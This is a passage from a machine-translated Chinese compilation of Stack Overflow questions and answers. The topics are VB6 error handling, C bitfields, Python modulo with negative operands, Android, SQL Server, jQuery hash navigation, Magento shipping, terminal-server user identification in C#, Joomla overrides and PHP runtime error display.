3    If Err.Number <> 3026 Or Err <> 0 Then ????????? 
```

您如何将第 3 行中的错误发送回调用函数？以下是实现这一目标的唯一方法吗？

```
errNum = Err.Number
On Error Goto 0    
Err.Raise errNum 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T13:47:20.613

在处理程序中使用`On Error GoTo`并重新引发错误`Err.Raise`。

```
Private Function DoSomething(ByVal Arg as String)

    On Error GoTo Handler

    Dim ThisVar as String
    Dim ThatVar as Long

    ' Code here to implement DoSomething...

    Exit Function

Handler:
    Err.Raise Err.Number, , "MiscFunctions.DoSomething: " & Err.Description

End Function 
```

然后，您将能够通过`Err.Number`和获取调用者中的错误号和描述`Err.Description`。

如果调用者也在使用`On Error GoTo`，您将在那里的处理程序中看到它们。

如果调用者正在使用`On Error Resume Next`，那么您仍然可以内联使用这些相同的变量。

我更喜欢第一个选项，在所有函数和子程序中使用 On Error Goto，因为这似乎是使用 VB6 内置错误引发功能的自然方式。您还可以像上面的示例一样更新被调用函数的处理程序中的描述，并获得一个伪调用堆栈，您最终可以在调试期间记录或显示给自己。

更多 VB6 错误处理思路：

[是否可以在 VB6 中以编程方式检索调用堆栈？](https://stackoverflow.com/questions/127645)

[如何清理函数中的错误处理？](https://stackoverflow.com/questions/9258711)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:32:55.583

为什么不添加`ByRef errorCode as Long`到被调用函数的 args 并将其设置为等于 Err.Number 之后`' do something`

或者你可以有一个名为的公共字段`ErrorCode as Long`，你可以在之后设置`' do something`

我使用过很多工业控制 API，并且这两种方法都被使用过。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-16T21:52:53.903

如果您只是想将错误传递回原始调用者而不处理它，那么您想删除子函数中的任何 ON ERROR ：

```
Public Sub ParentSub()
    On Error GoTo ErrorHandler
    ' do something
    Call ChildSub()
    ' do something
    Exit Sub
ErrorHandler:
    ' handle the error here
End Sub

Public Sub ChildSub()
    ' do something
    ' if there is an error here, the error will be handled in ErrorHandler of ParentSub
End Sub 
```

或者如果你想在两个潜艇中处理它：

```
Public Sub ParentSub()
    On Error GoTo ErrorHandler
    ' do something
    Call ChildSub()
    ' do something
    Exit Sub
ErrorHandler:
    ' handle the error here
End Sub

Public Sub ChildSub()
    On Error GoTo ErrorHandler
    ' do something
   Exit Sub
ErrorHandler:
    ' handle the error here and pass it back to the ParentSub to handle it as well
    Err.Raise Err.Number
End Sub 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-16T14:37:06.837

只要引发错误的函数没有（ON ERROR RESUME ---），您就可以轻松地将错误发送到上层（调用）子/函数，这样，错误处理只留在上层。否则你将不得不处理被调用函数内部的错误

```
Private Sub Command1_Click()
     Dim test As Integer
     On Error Resume Next
     test = myFunction     'Calling a function that is known to have an error
     If Err <> 0 Then
         MsgBox "MyFunction failed because:" & Err.Description 'Error is passed
     End If

End Sub

'--------------------------    

Function myFunction() As Integer
    Dim i As Integer
    i = 1
    i = 4 / 0   'This will raise an Error, and control returns to the calling sub
    i = 2       'This will never get executed
    myFunction = i
End Function 
```

# c - 8 位输入给出奇怪的行为，因为 16/32 位给出了小端/大端

> ID：14348218
> 
> 赞同：1
> 
> 时间：2013-01-15T22:36:07.903
> 
> 标签：c, pointers, struct, network-programming, bit-manipulation

我有一个像这样的C结构......

```
struct icmp_prefixopt {
    u_int8_t        icmpopt_type;
    u_int8_t        icmpopt_len;
    u_int8_t        prefixlen;
    u_int8_t        lflag:1;
    u_int8_t        aflag:1;
    u_int8_t        reserved:6;

}; 
```

我在同一个模块中为这样的成员提供了价值-

```
 popt= (struct icmp_prefixopt *)
                    malloc(sizeof(struct icmp_prefixopt));

  popt->icmpopt_type = 3;
  popt->icmpopt_len = 4;
  popt->prefixlen = (u_int8_t)strtoul(arg, (char **)NULL, 0);

     arg = index(arg, '+');
            if (arg) {
                    ++arg;
                    popt->lflag = ((u_int8_t)strtoul(arg, (char **)NULL, 0))&1;
            }

     arg = index(arg, '+');
            if (arg) {
                    ++arg;
                    popt->aflag = ((u_int8_t)strtoul(arg, (char **)NULL, 0))&1;
            }

     arg = index(arg, '+');
            if (arg) {
                    ++arg;
                 popt->reserved = 32;  //((u_int8_t)strtoul(arg, (char **)NULL, 0))<<2;
            } 
```

其中 arg 是传递给此模块的命令行参数。

现在以十六进制格式查看结构执行后的内容->

```
 03 04 20 81

   icmpopt_type: seems fine
   icmpopt_len: seems fine
   prefixlen: seems fine 
```

但是在它们的构成字节中，其他 3 个字段的位看起来是相反的

```
 lflag:1; aflag:1; reserved:6 
```

所以它应该是 -`10100000=A0`但实际上他们是`=>81=10000001`

这给我带来了很多问题......

1.  与小端/大端有什么关系？

2.  如果是，那么 8 位的 htonl 和 htons 等功能的对应物是什么。

3.  如果不是，可能是什么问题，或者我完全误解了什么？

4.  什么是最好的方法？要修改结构本身内这些字段的顺序，
    还是应用一些位运算符并在此处本身移位？

在命令行提供的输入 -

```
 32+1+0+32 
```

最后的 32 在这里没有用，因为我在模块本身中修复了 32 以进行测试。虽然我的实际目的也需要考虑这个领域。

请尽快用任何替代方法帮助我。

提前谢谢。

**编辑：**

![在此处输入图像描述](../Images/436802e996c53e237578177b073f0561.png)

这是我需要创建的实际结构，并且随着创建，需要为用户提供通过 GUI 为所有字段指定值的规定。（现在只能通过 linux 命令行）。

我想我现在已经把问题说得更清楚了，但如果需要任何进一步的信息，我很乐意补充。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T22:39:37.020

编译器如何选择打包位域完全取决于实现。它不一定与字节顺序有关。

`htnol`（和类似的）不适用于位域。如果您需要有保证的订单，那么您需要自己手动打包`uint8_t`。例如：

```
struct icmp_prefixopt {
    u_int8_t        icmpopt_type;
    u_int8_t        icmpopt_len;
    u_int8_t        prefixlen;
    u_int8_t        stuff;
}

...

popt->stuff = (lflag << 7) | (aflag << 6); 
```

当然，在实践中，您应该使用 sensible `#define`s 而不是幻数（对于 6 和 7）。您可能会决定将其包装在一堆 setter 和 getter 函数中。

# python - Python中带有负操作数的整数除法和模运算

> ID：14348219
> 
> 赞同：9
> 
> 时间：2013-01-15T22:36:10.450
> 
> 标签：python, modulo, integer-division, negative-number, operand

当我在 Python 3.3.0 中输入这些表达式时会出现问题

```
-10 // 3  # -4
-10 % 3   #  2
10 // -3  # -4
10 % -3   # -2
-10 // -3 #  3 
```

看起来好像它采用近似浮点（-3.33）？并在整数除法中向下取整，但在模运算中它会做一些完全不同的事情。似乎它返回余数 +/-1 并且仅根据负操作数的位置切换符号。即使在查看本网站上的其他答案后，我也感到非常困惑！我希望有人也能清楚地解释这一点！这本书说提示：回想一下这个神奇的公式 a = (a//b)(b)+(a%b) 但这似乎并没有为我清除水。

-提前致谢！

**编辑：**这些只是我对发生的事情的个人评估（上图），我知道，我完全离开了！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-15T22:43:47.633

那里的整数除法只占最后获得的数字的底数。

```
10/3  -> floor(3.33)  ->  3
-10/3 -> floor(-3.33) -> -4 
```

**[（为什么它地板）](http://python-history.blogspot.in/2010/08/why-pythons-integer-division-floors.html)**

* * *

另一方面，模运算遵循**[数学定义](http://en.wikipedia.org/wiki/Modulo_operation)**。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-15T22:45:34.290

*   魔法公式：`a = (a // b) * b + (a % b)`
*   `a: -10`
*   `b: 3`
*   `a // b: -4`
*   `a % b: 2`

    代入魔法公式：`-10 = -4 * 3 + 2 = -12 + 2 = -10`

*   `a: 10`

*   `b: -3`
*   `a // b: -4`
*   `a % b: -2`

    在魔术公式中：`10 = -4 * -3 - 2 = 12 - 2 = 10`

所以这个神奇的公式似乎是正确的。

如果你定义`a // b`为`floor(a / b)`（它是），`a % b`应该是`a - floor(a / b) * b`. 让我们来看看：

*   `a: -10`
*   `b: 3`
*   `a % b = a - floor(a / b) * b = -10 - floor(-3.33) * 3 = -10 + 4 * 3 = 2`

总是被搁置的事实`a // b`很容易记住（请阅读 Cthulhu 的第一个链接，这是 Python 创建者的解释）。对于 .. 中的负数`a`，请`a % b`尝试想象一个从开头`0`并具有`b`列的数字表：

```
b = 3:

0  1  2
3  4  5
6  7  8
9 10 11
... 
```

如果`a`是单元格中的数字，则为`a % b`列号：

```
a         a % b
_______________
0  1  2   0 1 2
3  4  5   0 1 2
6  7  8   0 1 2
9 10 11   0 1 2 
```

现在将表格扩展回底片：

```
 a          a % b
 __________________
-12 -11 -10   0 1 2
 -9  -8  -7   0 1 2
 -6  -5  -4   0 1 2
 -3  -2  -1   0 1 2
  0   1   2   0 1 2
  3   4   5   0 1 2
  6   7   8   0 1 2
  9  10  11   0 1 2 
```

`-10 % 3`将是`2`。否定`a`in`a % b`会出现在这种情况下。`a % b`负数`b`不会出现太多。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T23:06:52.873

[一个简单的规则：](http://docs.python.org/3/library/functions.html#divmod)对于`a % b = c`，如果`c`不为零，则应该与 具有相同的符号`b`。

并应用神奇的公式：

`10 % -3 = -2`=>`10 // -3 = (10 - (-2)) / (-3) = -4`

`-10 % 3 = 2`=>`-10 // 3 = (-10 - 2) / 3 = -4`

`-10 % -3 = -1`=>`-10 // -3 = (-10 - (-1)) / (-3) = 3`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T22:49:27.560

好的，所以我做了一些挖掘，我认为问题不在于 Python，而在于 Modulo 函数。我的答案基于[http://mathforum.org/library/drmath/view/52343.html](http://mathforum.org/library/drmath/view/52343.html)

10 % 3 使用小于 10 的 3 的最大倍数。在这种情况下，9\. 10 - 9 = 1

-10 % 3 做同样的事情。它仍在寻找小于 -10 的 3 的倍数。在这种情况下，-12。(-10) - (-12) = 2

# android - 模拟器意外停止应用程序

> ID：14348220
> 
> 赞同：0
> 
> 时间：2013-01-15T22:36:12.243
> 
> 标签：android, android-emulator, android-manifest

我创建了一个应用程序。代码很好，没有错误，但是在模拟器上运行时会显示消息“应用程序已意外停止”

清单代码：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.gregjacobs.enhancedquotes">
<application android:icon="@drawable/icon">
    <activity android:name=".QuotesMain" android:label="@string/app_name">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <activity android:name=".QuoteEdit" android:label="@string/app_name"></activity>
</application>
</manifest> 
<!--<?xml version="1.0" encoding="utf-8"?>-->
<!--<manifest xmlns:android="http://schemas.android.com/apk/res/android"-->
<!--      package="com.gregjacobs.enhancedquotes"-->
<!--      android:versionCode="1"-->
<!--      android:versionName="1.0">-->
<!--    <application android:icon="@drawable/icon" android:label="@string/app_name">-->
<!--        <activity android:name=".quotes"-->
<!--                  android:label="@string/app_name">-->
<!--            <intent-filter>-->
<!--                <action android:name="android.intent.action.MAIN" />-->
<!--                <category android:name="android.intent.category.LAUNCHER" />-->
<!--            </intent-filter>-->
<!--        </activity>-->
<!---->
<!--    </application>-->
<!---->
<!---->
<!--</manifest> --> 
```

[logcat 链接](http://tinypic.com/r/2n1v0ck/6)

# c# - VARCHAR(MAX) 和 > 8000 字节/ExecuteNonQuery

> ID：14348223
> 
> 赞同：2
> 
> 时间：2013-01-15T22:36:21.743
> 
> 标签：c#, sql, sql-server-2008-r2, executenonquery, varcharmax

> **可能重复：**
> [VARCHAR(MAX) 和 > 8000 字节/ExecuteNonQuery（重新发布）](https://stackoverflow.com/questions/14348778/varcharmax-and-8000-bytes-executenonquery-repost)

我正在尝试通过插入 > 8000 个字符（从网页提交）`ExecuteNonQuery`。存储过程将参数定义为`VARCHAR(MAX)`. 列是`VARCHAR(MAX)`。理论上，2GB的数据应该是可以通过的。

但是，在一个简单的测试中，在 SSSMS 中，我执行以下操作：

```
declare @x varchar(max)
set @x = replicate ('a', 10000)
select @x, len(@x)

-- Output shows 8000, not 10000 
```

所以，也许这是 SSMS 查询本身的一个限制，但是当我从代码中传递数据时，它仍然会被截断。我确信我错过了一些基本/明显的东西，但我无法弄清楚。

我该怎么做才能传递数据> 8000？

注意：我不需要关于 SSMS 的答案。这只是一个测试。我正在尝试使用 C# 和`ExecuteNonQuery`.

```
 public static void UpdateTerms(string terms)
   {
        Database db = DatabaseFactory.CreateDatabase();
        db.ExecuteNonQuery("uspUpdateTerms", terms);
   } 
```

我的问题在这里得到了解答： [如何使用 ExecuteNonQuery 在 VARCHAR(MAX) 列中插入超过 8000 个字符？](https://stackoverflow.com/questions/14348778/sql-varcharmax-and-8000-bytes-sql-2008-c-sharp-executenonquery-repost)

这是一个缓存问题。

# android - 在 android 上为 EGL 设置 Tracing 方法

> ID：14348231
> 
> 赞同：2
> 
> 时间：2013-01-15T22:36:42.780
> 
> 标签：android

从[https://android.googlesource.com/platform/frameworks/native/+/16928bfeca8858a0acae6942fc68c14a040b92ff/opengl/libs/EGL/egl.cpp](https://android.googlesource.com/platform/frameworks/native/+/16928bfeca8858a0acae6942fc68c14a040b92ff/opengl/libs/EGL/egl.cpp)，它说，我可以设置跟踪方法：

```
/**
 * There are three different tracing methods:
 * 1\. libs/EGL/trace.cpp: Traces all functions to systrace.
 *    To enable:
 *      - set system property "debug.egl.trace" to "systrace" to trace all apps.
 * 2\. libs/EGL/trace.cpp: Logs a stack trace for GL errors after each function call.
 *    To enable:
 *      - set system property "debug.egl.trace" to "error" to trace all apps.
 * 3\. libs/EGL/trace.cpp: Traces all functions to logcat.
 *    To enable:
 *      - set system property "debug.egl.trace" to 1 to trace all apps.
 *      - or call setGLTraceLevel(1) from an app to enable tracing for that app.
 * 4\. libs/GLES_trace: Traces all functions via protobuf to host.
 *    To enable:
 *        - set system property "debug.egl.debug_proc" to the application name.
 *      - or call setGLDebugLevel(1) from the app.
 */ 
```

我怎样才能在实际设备上做到这一点？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T22:43:16.477

1.  亚行外壳
2.  setprop debug.egl.trace 错误
3.  停止
4.  开始
5.  运行应用

# javascript - 页面加载后如何导航到主题标签？

> ID：14348233
> 
> 赞同：18
> 
> 时间：2013-01-15T22:36:56.347
> 
> 标签：javascript, hashtag

我想做与我迄今为止发现的相反的事情。我用 js 设置了很多高度，我想在页面加载后导航到 url 中的主题标签。我猜这很简单，但我没有看到明显的答案......例如，请查看这里......

[http://alavita.rizenclients.com/#story](http://alavita.rizenclients.com/#story)

尝试使用代码进行此操作...

```
$(window).load(function() {
    var hashTag = window.location.hash;
    window.location = '/' + hashTag;
}); 
```

实际上并没有把我带到标记部分的顶部......

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-01-15T23:02:36.987

如果您只想在页面加载后更改哈希：

```
window.onload = function (event) {
    window.location.hash = "#my-new-hash";
}; 
```

如果您想导航到带有新哈希的 URL：

```
window.location.href = "http://website.com/#my-new-hash"; 
```

如果你想监听 URL 哈希的变化；您可以考虑使用[window.onhashchange](https://developer.mozilla.org/en-US/docs/DOM/window.onhashchange) DOM 事件。

```
window.onhashchange = function () {
    if (location.hash === "#expected-hash") {
        doSomething();
    }
}; 
```

~~但还不是每个主要浏览器都支持它。~~它现在拥有广泛的[浏览器支持](http://caniuse.com/#feat=hashchange)。您还可以通过小间隔轮询来检查更改`window.location.hash`，但这也不是很有效。

对于**跨浏览器解决方案**；我建议[Ben Alman 的**jQuery hashchange 插件**](http://benalman.com/projects/jquery-hashchange-plugin/)将这些方法和其他一些方法与回退机制结合起来。

编辑：您的问题更新后，我知道您希望页面滚动到书签？：

您可以使用`Element.scrollTop`jQuery 或 jQuery 的`$.scrollTop()`方法。

```
$(document).ready(function (event) {
    var yOffset = $("#my-element").offset().top;
    $("body").scrollTop(yOffset);
}); 
```

[请参阅此处](http://api.jquery.com/scrollTop/)的文档。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-10-02T10:47:53.967

出于某种原因，MS Edge 42 和 IE 11 都不会为我滚动到新书签，即使`window.location.reload(true)`在设置新书签后进行操作也是如此。所以我想出了这个解决方案：在你正在加载的页面上插入这个脚本（需要 jquery）

```
$(document).ready(function() {
 var hash = window.location.hash;
 if (hash) {
  var elem = document.getElementById(hash.substring(1));
  if (elem) {
   elem.scrollIntoView();
  }
 }
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-07-28T21:52:57.517

使用`scrollTo`或不考虑由[css 选择器](https://developer.mozilla.org/en-US/docs/Web/CSS/:target)`scrollIntoView`创建的任何偏移量，该选择器通常用于通过将其设置为负值来使页面滚动到锚点上方。[`:target`](https://developer.mozilla.org/en-US/docs/Web/CSS/:target)`position: relative``top`

这将在尊重选择器的同时滚动到锚点`:target`：

```
if (location.hash) {
    window.location.replace(location.hash);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T22:39:38.763

您可以设置当前位置：

```
window.location = 'http://alavita.rizenclients.com/#story'; 
```

或者设置哈希（如果还没有），然后重新加载：

```
window.location.hash = hashTag;
window.location=window.location.href; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T22:56:41.897

你改变了你的问题。

看看这个解决方案。 [https://stackoverflow.com/a/2162174/973860](https://stackoverflow.com/a/2162174/973860)以便您了解发生了什么以及如何实现跨浏览器解决方案。

注意：在底部，他提到了一个 jquery 插件，可以满足您的需求。

[http://benalman.com/projects/jquery-hashchange-plugin/](http://benalman.com/projects/jquery-hashchange-plugin/)

这个插件将允许你做这样的事情。这将适用于您当前的页面。但是您可能希望将其修改为更健壮。

```
$(function(){

    // Bind the event.
    $(window).hashchange( function(){
        // get the hash
        var hash = window.location.hash;
        // click for your animation
        $('a[href=' + hash + ']').click();
    })

    // Trigger the event (useful on page load).
    $(window).hashchange();

}); 
```

# magento - 禁止在 Magento 中向所有商店中的特定国家/地区发货，除了一个

> ID：14348237
> 
> 赞同：3
> 
> 时间：2013-01-15T22:37:14.177
> 
> 标签：magento, magento-1.7

除了 .co.uk 商店视图之外，我们希望禁止从我们所有的商店视图中向英国发货……

我按照[http://techportal.inviqa.com/2011/06/09/creating-a-custom-magento-shipping-method/](http://techportal.inviqa.com/2011/06/09/creating-a-custom-magento-shipping-method/)和[http://www.magentocommerce.com上的指南创建了自己的自定义运输模块/wiki/5__-_modules_and_development/shipping/create-shipping-method-module](http://www.magentocommerce.com/wiki/5_-_modules_and_development/shipping/create-shipping-method-module)

如您所见，在上述两个链接中，都有一个 xml 块说明是否允许所有国家或特定国家

```
<sallowspecific>0</sallowspecific> 
```

上述块的描述如下

```
sallowspecific  set to 1 to limit the countries the rate is applicable to 
```

我真的可以用一个例子来说明 config.xml 应该是什么样子，将 sallowspecific 设置为 1

非常感谢任何输入！

谢谢！

杰夫

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T16:25:57.957

有一个配置选项可以设置您允许的国家/地区。默认情况下，所有国家都被选中。您可以将其修改为商店视图级别以删除英国商店。你可以在这里找到它：

`System -> Configuration -> General -> General -> Countries Options -> Allow Countries`

如果会有多个这样的情况，我建议在全球范围内禁用英国和任何其他国家/地区，然后在每个商店/商店视图级别启用您想要的国家/地区。这应该可以帮助您管理大多数商店视图，而无需手动更新每一个视图。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T23:47:32.717

如果用户在安装后未设置这些代码行，则只会为您的模块设置默认值

```
<default>
    <carriers>
        <shippingName>
            <sallowspecific>0</sallowspecific> 
```

当`sallowspecific`设置为 0 时，它将启用您的国家/地区选择器，以便您可以选择要运送到哪个国家/地区，以便更好地了解这项工作如何查看“统一费率”并更改“运送到适用国家/地区”的选项' 并看看“运送到特定国家/地区”会发生什么。

这就是 1 和 0 的集合

```
 <select id="carriers_flatrate_sallowspecific" name="groups[flatrate][fields][sallowspecific][value]" class="shipping-applicable-country select">
     <option value="0" selected="selected">All Allowed Countries</option>
     <option value="1">Specific Countries</option>
 </select> 
```

如果`sallowspecific`设置为 1，那么您的默认值应如下所示

```
<default>
    <carriers>
        <shippingName>
            <sallowspecific>0</sallowspecific>
            <specificcountry>US,GB</specificcountry> 
```

在你的 system.xml 你需要有

```
 <sallowspecific translate="label">
        <label>Ship to Applicable Countries</label>
        <frontend_type>select</frontend_type>
        <sort_order>90</sort_order>
        <frontend_class>shipping-applicable-country</frontend_class>
        <source_model>adminhtml/system_config_source_shipping_allspecificcountries</source_model>
        <show_in_default>1</show_in_default>
        <show_in_website>1</show_in_website>
        <show_in_store>1</show_in_store>
    </sallowspecific>
    <specificcountry translate="label">
        <label>Ship to Specific Countries</label>
        <frontend_type>multiselect</frontend_type>
        <sort_order>91</sort_order>
        <source_model>adminhtml/system_config_source_country</source_model>
        <show_in_default>1</show_in_default>
        <show_in_website>1</show_in_website>
        <show_in_store>1</show_in_store>
        <can_be_empty>1</can_be_empty>
    </specificcountry> 
```

然后转到每个商店视图并选择适用的国家。

# c# - c#服务如何识别终端服务服务器上的当前用户登录名？

> ID：14348249
> 
> 赞同：0
> 
> 时间：2013-01-15T22:38:06.617
> 
> 标签：c#, service, windows-services, terminal-services, winlogon

c#服务如何获取调用它的终端服务器用户的身份（登录名）？

我编写了 ac# 服务来监听 http 请求并返回当前登录用户。该请求由在浏览器中运行的 javascript 初始化。到目前为止效果很好，但它不适用于可以同时连接多个用户的终端服务器。我目前正在做的是查询“explorer”的processId，然后使用“GetOwner”来获取用户登录名。

服务有没有办法识别为其生成 http 请求的用户？我可以以某种方式获取 http 会话并识别拥有它的用户吗？我需要返回用户身份作为响应。

谢谢，JJ

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T17:59:36.940

您需要获取 HTTP 请求在客户端使用的端口，将其与机器上的活动出站 TCP 连接列表进行匹配，并识别浏览器的进程 ID（例如通过[GetExtendedTcpTable](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365928(v=vs.85).aspx)）。从那里您可以获取进程的会话 ID（例如通过使用[Process.SessionId](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.sessionid.aspx)），然后查找与会话关联的用户名（例如通过使用[WTSQuerySessionInformation](http://msdn.microsoft.com/en-us/library/windows/desktop/aa383838(v=vs.85).aspx)或[Cassia](https://code.google.com/p/cassia/)）。或者，您可以调用 OpenProcess 和 GetSecurityInfo 从进程 ID 中获取用户的 SID，如[本答案](https://stackoverflow.com/a/559392/88885)所述。后一种方法可能更好，因为在单个会话中可能有进程作为不同的用户运行（例如，使用运行方式）。

不过，这一切似乎都是一种真正的痛苦。你不能只在浏览器中使用 Windows 身份验证吗？

# joomla - Joomla 2.5 'Alternative Menu Items' 和 'Category Blog' （同一组件的多个模板布局覆盖）

> ID：14348250
> 
> 赞同：2
> 
> 时间：2013-01-15T22:38:14.057
> 
> 标签：joomla, menu, joomla2.5, blogs

我遇到了一个与“替代菜单项”有关的非常奇怪的问题，这里描述了用法：http:
[//docs.joomla.org/Layout_Overrides_in_Joomla_1.6](http://docs.joomla.org/Layout_Overrides_in_Joomla_1.6)

以下文件位于：`templates/testtemplate/html/com_content/category`这些是我采取的步骤：

这些文件：
`blog.php, blog.xml, blog_children.php, blog_item.php, blog_links.php`

已更改为：
`bloggal.php, bloggal.xml, bloggal_children.php, bloggal_item.php, bloggal_links.php`

对于文件 bloggal.xml - 我更改了这部分：
`<layout title="COM_CONTENT_CATEGORY_VIEW_BLOG_TITLE"`

到：
`<layout title="Blog Gallery"`

然后将子标题添加到 bloggal.php 和 bloggal_item.php 以便我可以查看子项是否有效。

现在有趣的部分是 bloggal.php 工作正常，但从 bloggal_item.php 中提取的子项没有出现。

我已经在多个 Joomla 安装上使用相同的模板完成了这个测试，其中一个似乎可以工作，而其余的则没有。

我能想到的唯一一件事是 Joomla 可能有一个回归，因为工作的是一个更新的安装，其余的是更新的版本。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-24T17:09:55.340

从 Joomla 1.6 开始，您可以为每个类别选择替代布局。包括那些你有覆盖的人。配置菜单项时无需选择备用布局；）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-04T21:22:52.697

对不起，我应该早点发布这个。我发现了这个问题，我重命名了：

```
<field name="layout_type"
    type="hidden"
    default="blog"
/> 
```

到：

```
<field name="layout_type"
    type="hidden"
    default="bloggal"
/> 
```

本质上是在寻找一个不存在的模型。

如果您这样做了，请执行以下操作来修复它：

1.  重命名`default="whatever"`回`default="blog"`
2.  在您的数据库中转到`_menu`表
3.  通过标题栏查找您的菜单项
4.  转到参数并更改`{"layout_type":"bloggal"...`为`{"layout_type":"blog"...`

# php - PHP 运行时错误

> ID：14348252
> 
> 赞同：0
> 
> 时间：2013-01-15T22:38:21.360
> 
> 标签：php, runtime-error, xdebug

我正在编写 PHP 一段时间。

我使用带有**PHP 5.4**、**SQlite 3**、**Apache 2.4的****Windows XP SP3**作为开发环境。远程主机服务器（不是我的）是带有**PHP 5.3**、**Apache 2.2**、**IIS 7.0**和**SQL Server 2008的****Windows Server** 2008 。

 ******我的编辑器是简单而美妙的**EditPlus**。

关于**Javascript**，这很好，因为**Firefox**加上了不起的插件**FireBug**，它允许完整的 HTML + CSS + Javascript 调试。

我的问题是我的开发环境（我的个人机器）中的 PHP 错误管理。

PHP 语法错误通常显示为行号等，可以轻松修复。还有用于检查语法的在线工具（例如[pilliap](http://www.piliapp.com/php-syntax-check/)）和其他在线工具来测试 PHP 片段的执行（例如[writecodeonline.com](http://writecodeonline.com/php/)）

但是，我的诅咒是运行时错误（例如，未初始化的变量**$ _SESSION**）。有时它显示正确，但有时错误消息（包括正确的行号！）嵌入在源代码中，在虚假的 HTML 标记中。简单的测试表明没有问题。但我的真实代码通常会这样做。

这不是阻止我前进的情况，但它是不愉快的。

我在互联网上没有找到任何关于这种奇怪行为的提示，我很好奇是否有人可以提供线索。

***我的问题：PHP 运行时错误怎么可能有时会出现在浏览器中（根据开发环境的需要），有时它会出现在 Javascript + HTML 源代码中以及虚假的 HTML 标记中？***

*PS：不是关于 PHP 日志文件或 PHP.Ini 文件中的显示错误设置的问题。*

*PS2：无论是否安装了 XDebug，都会发生同样的情况。*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:40:55.580

使用 php`error_log()` [函数](http://php.net/manual/en/function.error-log.php)以您想要的方式显示有关错误的信息。

除此之外，请查看您的`php.ini`配置文件。有许多变量 ( `html_errors`, `error_log`, `display_errors`, `error_reporting`...) 可以根据需要设置错误的输出，这样它们就不会弄乱 html 输出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T22:40:09.147

这就是`log_errors`错误日志文件的用途。只需阅读它们，您的所有错误都会很好地列出。

* * *

编辑：您还可以拖动页面上的所有错误以显示以下内容：

首先，设置`error_prepend_string`和`error_append_string`引人注目的东西。例如，您可以使用`<phperrormessage>`和`</phperrormessage>`。只是任何不太可能出现在您的合法输出中的东西。

然后将其放在代码的开头：

```
ob_start(function($c) {
    if( preg_match_all("(<phperrormessage>(.*?)</phperrormessage>)is",$c,$matches)) {
      $c = preg_replace("(<phperrormessage>(.*?)<phperrormessage>)is","",$c);
      $c = str_replace(
          "</body>",
          "<div id=\"phperrors\">".implode("<hr />",$matches[1])."</div></body>",
          $c);
    }
    return $c;
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-16T04:39:12.630

论坛和问答网站确实是一个很好的学习资源！感谢**Kolink**和**StackOverflow.com**。

根据*Kolink*的提示，我进行了一些研究，然后我创建了一种新方法来驯服 PHP 中的绝大多数运行时错误。

我还没有弄清楚到底发生了什么，但我发现了一种强大的方法，它不使用默认的 PHP 错误处理，而是在同一个地方收集所有运行时错误消息。

请注意，PHP 编译错误对我来说不是问题，因为任何语法检查器都可以解决它，包括 PHP.exe。

假设我有一个包含许多潜在运行时错误的 PHP 源代码。所以我将我的代码放在 HTML 标记内的以下行中，例如在我需要使用 PHP 代码的初始位置。

```
 <script type="text/javascript">
 var nerrors = 0;               // PHP Errors count in Javascript

 function PHPErrors() {         // Javascript  Function that wraps the PHP Code
  <?php
               // MyErrorHandler is my function that my custom error handler
               // uses with error parameters in that given order.

     function myErrorHandler($errno, $errstr, $errfile, $errline) {
     echo "document.getElementById('PHPErro').innerHTML += " . 
      "\"$errno: $errstr ($errline)<br>\";\r\n";        
     echo "nerrors = nerrors + 1;\r\n";
     return true;
 }
      // That's the line the set my custom new error-handling
      // disabling the default error handling
 $old_error_handler = set_error_handler("myErrorHandler");

      // Below random PHP code full of errors 
 $b = $a;                 // PHP Error 1
 $c = $a +1;              // PHP Error 2
 $d = $a + 1;             // PHP Error 3  
 $e = $_SESSION['glove'];  // PHP Error 4
?>
      // No PHP runtime error deserves a nice messagen
if (nerrors===0) {
   document.getElementById('PHPError').innerHTML =
                    "Well done! PHP without errors."; } 
}                        // End Javascript Function 
```

在这段代码之后，您可以自由地添加额外的 Javascript 和 PHP。

最后，我将这 2 行放在 HTML 正文部分中的某个位置。

```
 <p id="PHPError"> </p>
    <button onclick="PHPErrors()">Show me all PHP runtime errors</button> 
```

当我浏览这个 PHP 页面时，我可以看到这个按钮。所以我按下它，我可以看到所有 PHP 运行时错误消息或令人愉快的**“干得好……”**消息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-17T02:29:59.343

最后，我发现了 PHP 会发生什么。

默认的 PHP 错误处理会在正文部分生成错误。使用**XDebug**消息更详细，但同样的情况也会发生。

因此，当我将 PHP 代码放在 JS 函数中时，在 BODY 部分之前，此行为不起作用，因为 BODY 部分之前的 HTML 标记会产生垃圾。

语法错误是不同的，因为它是 PHP 解释器的前一个阶段，是在运行 PHP + HTML 代码之前发生的。

